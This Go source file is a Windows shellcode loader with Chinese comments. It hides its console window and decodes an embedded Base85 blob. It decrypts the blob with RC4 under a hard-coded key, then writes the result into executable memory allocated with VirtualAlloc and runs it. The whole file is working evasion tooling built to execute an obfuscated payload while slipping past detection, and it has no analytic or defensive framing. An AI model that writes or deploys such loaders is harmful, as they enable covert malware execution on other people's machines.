package main

import (
	"crypto/rc4"
	"fmt"
	"github.com/eknkc/basex"
	"github.com/lxn/win"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

func main() {
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	key := []byte("acb")
	encodedMessage := "iuk}Vbehy^FLN7tH;jWq@Nk{4NEfB#w@KM_Skh_9~8p^1)!%RD2v5SPziJ+j+8?kSlyKEB<{XR#@tyctBZ`Pzmd&t<rs&Eb~vxpVLYy$Sp5@O-|jm^U|eI=epR`~81zYsF8#7`@~XFpHAFr~f#knt@}doORUrpxd8Z=wF1|r2ZrVXXx|<`Pc^4O4|fDo$cjP#zvjKt&~K@K(m&!H1Hv~^uG(}VgBgCAn)k}3^`qa2jy5>;pw*n3ncg$Nx;J43&pH|vi7X#`XH))>D(M5>-{awm{M5(*fQg)=rsTSbXpsmTR~sgP+}}Eg>=4W&ksAFin>xj0#g*#1^_m_j3pPBjW$<?xO8w?z_f<d@^!&G8hjM<%gN=$eyk|wpC&{ggMcl@C3}aTEGX4rJjUf?t_f@Jl$W{$cbN#P?-84yk9GrkwM)>{xk<2P7P?sfGe|T?YQ91x3_Yz$%7Yg$9iX*!<2Q09;*Qyu36MF<hBV+RZ>0azXD#Ll-7s_dj`zMa<mdh?gUU`|tw}w69e{hDgbLl+^xuT5&Hrf!VIFf+3~xb1NfX&GLzy3Lzt$l@Er;1wSKb?25`wD;a@5y-6>CE^heiW7>mns1Xi~2sqRzyIB(1!ttHOB{^YmH`&(HWI?PkY$T__M;x@fG$96C_L>lOtFODJr`}DMHyj<@~*RfC4z|{A4bFJ}|+{z*>qd}snQK3jsiEvGqec6l?74GR9)&kukIdE<6+R~2FvB5<=KW?kp67EmVKFq|Z2B_YL1n?b}o#<{M*O@O(HBfS^Pa+ae<2|Z}uK4?G~1A3Ad>ZsEu6?BGU^)MXqL`PSgeQ@27M#^t_dD0*_(mkg~wV;Y9~$&q~XlPkEY|*EiJ~r8&av*-k5Zcji!mmaQ3kWmH9e2@sPT$Y!-sSz-duu!2Sn-Nd}+^AV~R4&w<on9O@-pp}e=`Ty&HJAlS|T>)J?vK6O80~TVzr<Ld|D$JBbm4cuu(C0TRW(XsfMP&+<5rI-hIeGa87XfV}uem?B*$Xe(z1+q2~Xat9N2bG(ELdM7pJ|m_rV~`^!Qh?&dDME?k=#!l!@rpo+t>M}RSR-<Ruf2U0f+!smGd1(~5mnuc3$|r{LI0nCB}p-=ukj!r1N`dMGAkd_S"

	//定义base85
	base85, err := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	if err != nil {
		log.Fatalf("Failed to create Base85 encoding: %v", err)
	}
	//base85解密
	decodedrc4, err := base85.Decode(encodedMessage)
	if err != nil {
		log.Fatalf("Failed to decode Base85 message: %v", err)
	}

	cipher, _ := rc4.NewCipher(key)
	code := make([]byte, len(decodedrc4))
	fmt.Printf("%v", code)
	cipher.XORKeyStream(code, decodedrc4)

	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	// 分配内存并写入 shellcode 内容
	allocSize := uintptr(len(code))
	mem, _, _ := VirtualAlloc.Call(0, allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		panic("VirtualAlloc failed")
	}
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, code)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)
}
